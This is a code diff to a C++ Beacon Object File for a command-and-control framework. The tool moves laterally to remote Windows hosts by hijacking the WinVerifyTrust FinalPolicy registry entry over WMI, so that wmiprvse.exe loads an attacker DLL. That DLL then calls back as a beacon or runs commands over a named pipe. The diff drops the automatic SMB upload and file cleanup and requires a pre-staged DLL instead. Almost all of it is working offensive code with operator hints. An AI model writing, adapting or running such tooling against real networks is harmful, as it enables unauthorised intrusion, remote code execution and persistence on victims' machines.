@@ -2,20 +2,20 @@
  * tmb_sipexec.cpp -- Lateral movement via WinVerifyTrust FinalPolicy hijack
  *
  * Two modes:
- *   jump (mode=0):        Upload DLL, hijack FinalPolicy, trigger WMI, DLL calls back as beacon
- *   remote-exec (mode=1): Upload DLL, hijack FinalPolicy, trigger WMI, connect pipe, run cmd, return output
+ *   jump (mode=0):        Hijack FinalPolicy, trigger WMI, DLL calls back as beacon
+ *   remote-exec (mode=1): Hijack FinalPolicy, trigger WMI, connect pipe, run cmd, return output
  *
+ * DLL must be pre-staged on target (upload separately via SMB/upload command).
  * Uses current token. Run make_token / steal_token first if needed.
  *
  * Args (packed by aggressor/axscript):
  *   short  mode           0=jump, 1=exec
  *   char*  target         hostname or IP
+ *   char*  dll_path       path to DLL on target (local or UNC)
  *   char*  command        command to run (exec mode only, empty for jump)
- *   char*  dll_data       raw DLL bytes (length from BeaconDataExtract)
- *   char*  dll_path       UNC override path (if dll_data empty, use this path directly)
- *   char*  share          share name for upload (default ADMIN$)
  *   char*  guid           FinalPolicy GUID alias: "default", "driver", "https"
- *   short  no_cleanup     1 = skip registry restore + file delete
+ *   char*  func           $Function export name (default: SoftpubAuthenticode)
+ *   short  no_cleanup     1 = skip registry restore
  */
 
 #include <windows.h>
@@ -34,7 +34,6 @@ DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSEC
 DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeleteFileA(LPCSTR);
 DECLSPEC_IMPORT VOID     WINAPI KERNEL32$Sleep(DWORD);
 DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
 DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
@@ -109,13 +108,6 @@ static void derive_pipe_name(const char *dll_basename, char *out, int outlen) {
     MSVCRT$_snprintf(out, outlen, "\\\\%s\\pipe\\wkssvc_%08x", "", fnv1a(lower));
 }
 
-/* ---- Random DLL name ---- */
-static void random_dll_name(char *out, int len) {
-    /* ponytail: use GetTickCount as entropy source -- good enough for a filename */
-    DWORD tick = __rdtsc() & 0xFFFFFFFF;
-    MSVCRT$_snprintf(out, len, "tmb_%08x.dll", tick);
-}
-
 /* ---- Extract basename from path ---- */
 static const char* basename_of(const char *path) {
     const char *p = path;
@@ -124,32 +116,23 @@ static const char* basename_of(const char *path) {
     return p;
 }
 
-/* ================================================================
- * Phase 1: Upload DLL to target via SMB
- * ================================================================ */
-static BOOL upload_dll(const char *target, const char *share, const char *dll_name,
-                       const char *dll_data, int dll_len, char *remote_path_out, int path_len) {
-    /* Build UNC path: \\target\share\dll_name */
-    MSVCRT$_snprintf(remote_path_out, path_len, "\\\\%s\\%s\\%s", target, share, dll_name);
-
-    HANDLE hFile = KERNEL32$CreateFileA(remote_path_out, GENERIC_WRITE, 0, NULL,
-                                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        TMB_ERR("Failed to create %s (error %lu)", remote_path_out, KERNEL32$GetLastError());
-        return FALSE;
+/* ---- Check if file exists on target via SMB ---- */
+static BOOL file_exists(const char *target, const char *dll_path) {
+    /* If path is already UNC, use as-is. Otherwise build \\target\ADMIN$\... */
+    char check_path[512];
+    if (dll_path[0] == '\\' && dll_path[1] == '\\') {
+        MSVCRT$_snprintf(check_path, sizeof(check_path), "%s", dll_path);
+    } else {
+        /* Convert C:\Windows\foo.dll -> \\target\ADMIN$\foo.dll for check */
+        /* ponytail: just try opening via UNC with the basename on ADMIN$ */
+        MSVCRT$_snprintf(check_path, sizeof(check_path), "\\\\%s\\ADMIN$\\%s",
+                         target, basename_of(dll_path));
     }
 
-    DWORD written = 0;
-    BOOL ok = KERNEL32$WriteFile(hFile, dll_data, dll_len, &written, NULL);
+    HANDLE hFile = KERNEL32$CreateFileA(check_path, GENERIC_READ, FILE_SHARE_READ,
+                                         NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
     KERNEL32$CloseHandle(hFile);
-
-    if (!ok || (int)written != dll_len) {
-        TMB_ERR("Write failed (%lu of %d bytes)", written, dll_len);
-        KERNEL32$DeleteFileA(remote_path_out);
-        return FALSE;
-    }
-
-    TMB_INFO("Uploaded %d bytes -> %s", dll_len, remote_path_out);
     return TRUE;
 }
 
@@ -531,21 +514,6 @@ static BOOL pipe_exec(const char *target, const char *dll_basename,
 }
 
 /* ================================================================
- * Phase 5: Cleanup -- delete uploaded DLL
- * ================================================================ */
-static void cleanup_dll(const char *remote_path) {
-    /* Small delay for wmiprvse to release the file handle (DLL pins itself,
-     * but the initial CreateFile handle is released after LoadLibrary) */
-    KERNEL32$Sleep(500);
-    if (KERNEL32$DeleteFileA(remote_path)) {
-        TMB_INFO("Deleted %s", remote_path);
-    } else {
-        TMB_WARN("Could not delete %s (error %lu) -- DLL may be locked",
-                 remote_path, KERNEL32$GetLastError());
-    }
-}
-
-/* ================================================================
  * Resolve GUID string from alias
  * ================================================================ */
 static const char* resolve_guid(const char *alias) {
@@ -562,25 +530,6 @@ static const char* resolve_guid(const char *alias) {
 }
 
 /* ================================================================
- * Compute the local path the DLL will be at on target (for registry)
- * ================================================================ */
-static void compute_target_local_path(const char *share, const char *dll_name,
-                                       char *out, int outlen) {
-    /* Map share to local path:
-     * ADMIN$ -> C:\Windows\<dll>
-     * C$     -> C:\<dll>
-     * Otherwise assume C:\Windows\Temp */
-    if (MSVCRT$_stricmp(share, "ADMIN$") == 0) {
-        MSVCRT$_snprintf(out, outlen, "C:\\Windows\\%s", dll_name);
-    } else if (MSVCRT$strlen(share) == 2 && share[1] == '$') {
-        MSVCRT$_snprintf(out, outlen, "%c:\\%s", share[0], dll_name);
-    } else {
-        /* Generic -- assume C:\Windows\Temp */
-        MSVCRT$_snprintf(out, outlen, "C:\\Windows\\Temp\\%s", dll_name);
-    }
-}
-
-/* ================================================================
  * ENTRY POINT
  * ================================================================ */
 extern "C" void go(char *args, int alen) {
@@ -590,18 +539,19 @@ extern "C" void go(char *args, int alen) {
     short mode = BeaconDataShort(&parser);          /* 0=jump, 1=exec */
     int tmp = 0;
     char *target = BeaconDataExtract(&parser, &tmp);
+    char *dll_path = BeaconDataExtract(&parser, &tmp);
     char *command = BeaconDataExtract(&parser, &tmp);
-    int dll_len = 0;
-    char *dll_data = BeaconDataExtract(&parser, &dll_len);
-    char *dll_path_override = BeaconDataExtract(&parser, &tmp);
-    char *share = BeaconDataExtract(&parser, &tmp);
     char *guid_alias = BeaconDataExtract(&parser, &tmp);
     char *func_name = BeaconDataExtract(&parser, &tmp);
     short no_cleanup = BeaconDataShort(&parser);
-    short no_upload = BeaconDataShort(&parser);
 
     if (!target || !*target) {
         TMB_ERR("Target is required.");
+        return;
+    }
+
+    if (!dll_path || !*dll_path) {
+        TMB_ERR("DLL path is required (path on target or UNC).");
         return;
     }
 
@@ -611,78 +561,44 @@ extern "C" void go(char *args, int alen) {
     }
 
     /* Defaults */
-    if (!share || !*share) share = (char*)"ADMIN$";
     if (!func_name || !*func_name) func_name = (char*)"SoftpubAuthenticode";
     const char *guid = resolve_guid(guid_alias);
+    const char *dll_name = basename_of(dll_path);
 
     TMB_INFO("SIPExec %s -> %s (FinalPolicy: %s)",
              mode == 0 ? "jump" : "remote-exec", target, guid);
 
-    /* ---- Phase 1: Stage DLL ---- */
-    char remote_unc[512] = {0};
-    char dll_name[260] = {0};
-    char target_local_path[512] = {0};
-    BOOL uploaded = FALSE;
-
-    if (no_upload) {
-        /* --no-upload: user pre-staged the DLL, just use the path they gave */
-        if (dll_path_override && *dll_path_override) {
-            MSVCRT$_snprintf(target_local_path, sizeof(target_local_path), "%s", dll_path_override);
-        } else if (dll_len > 0) {
-            TMB_ERR("--no-upload requires --unc <path> (a path on target or UNC).");
-            return;
-        } else {
-            TMB_ERR("--no-upload requires --unc <path> (a path on target or UNC).");
-            return;
-        }
-        MSVCRT$_snprintf(dll_name, sizeof(dll_name), "%s", basename_of(target_local_path));
-        TMB_INFO("No upload -- using pre-staged: %s", target_local_path);
-    } else if (dll_path_override && *dll_path_override) {
-        /* UNC or remote path: write directly to registry, no upload */
-        MSVCRT$_snprintf(target_local_path, sizeof(target_local_path), "%s", dll_path_override);
-        MSVCRT$_snprintf(dll_name, sizeof(dll_name), "%s", basename_of(dll_path_override));
-        TMB_INFO("Using path directly: %s", dll_path_override);
-    } else if (dll_len > 0 && dll_data) {
-        /* Upload DLL to target */
-        random_dll_name(dll_name, sizeof(dll_name));
-        if (!upload_dll(target, share, dll_name, dll_data, dll_len,
-                        remote_unc, sizeof(remote_unc))) {
-            return;
-        }
-        uploaded = TRUE;
-        compute_target_local_path(share, dll_name, target_local_path, sizeof(target_local_path));
-    } else {
-        TMB_ERR("No DLL provided (pass file bytes or UNC path).");
+    /* ---- Phase 1: Verify DLL exists on target ---- */
+    if (!file_exists(target, dll_path)) {
+        TMB_ERR("DLL not found on target: %s", dll_path);
+        TMB_INFO("Upload it first: upload <local_path> \\\\%s\\ADMIN$\\%s", target, dll_name);
         return;
     }
+    TMB_INFO("DLL verified: %s", dll_path);
 
     /* ---- Initialize COM + WMI connections ---- */
     HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
         TMB_ERR("CoInitializeEx failed: 0x%08lx", hr);
-        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         return;
     }
 
-    /* Connect to root/default for StdRegProv registry operations */
     IWbemServices *pSvcDefault = wmi_connect(target, L"ROOT\\DEFAULT");
     if (!pSvcDefault) {
         TMB_ERR("Failed to connect to WMI root/default on %s", target);
-        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         OLE32$CoUninitialize();
         return;
     }
 
     /* ---- Phase 2: Hijack FinalPolicy via StdRegProv ---- */
     FP_BACKUP backup = {0};
-    if (!hijack_finalpolicy(pSvcDefault, guid, target_local_path, func_name, &backup)) {
+    if (!hijack_finalpolicy(pSvcDefault, guid, dll_path, func_name, &backup)) {
         pSvcDefault->Release();
-        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         OLE32$CoUninitialize();
         return;
     }
 
-    /* ---- Phase 3: Trigger via WMI query on root/cimv2 ---- */
+    /* ---- Phase 3: Trigger via WMI ---- */
     KERNEL32$Sleep(500);
 
     IWbemServices *pSvcCimv2 = wmi_connect(target, L"ROOT\\CIMV2");
@@ -690,7 +606,6 @@ extern "C" void go(char *args, int alen) {
         TMB_WARN("Failed to connect to root/cimv2 -- restoring");
         restore_finalpolicy(pSvcDefault, guid, &backup);
         pSvcDefault->Release();
-        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         OLE32$CoUninitialize();
         return;
     }
@@ -700,13 +615,12 @@ extern "C" void go(char *args, int alen) {
         restore_finalpolicy(pSvcDefault, guid, &backup);
         pSvcCimv2->Release();
         pSvcDefault->Release();
-        if (uploaded) KERNEL32$DeleteFileA(remote_unc);
         OLE32$CoUninitialize();
         return;
     }
     pSvcCimv2->Release();
 
-    /* ---- Phase 4: Restore registry (DLL is already loaded and pinned) ---- */
+    /* ---- Phase 4: Restore registry ---- */
     KERNEL32$Sleep(2000);
 
     if (!no_cleanup) {
@@ -722,11 +636,6 @@ extern "C" void go(char *args, int alen) {
     } else {
         TMB_OK("Jump complete. DLL loaded in wmiprvse.exe on %s", target);
         TMB_INFO("Payload should call back via its configured listener.");
-    }
-
-    /* ---- Phase 6: Cleanup DLL from disk ---- */
-    if (!no_cleanup && uploaded) {
-        cleanup_dll(remote_unc);
     }
 
     OLE32$CoUninitialize();
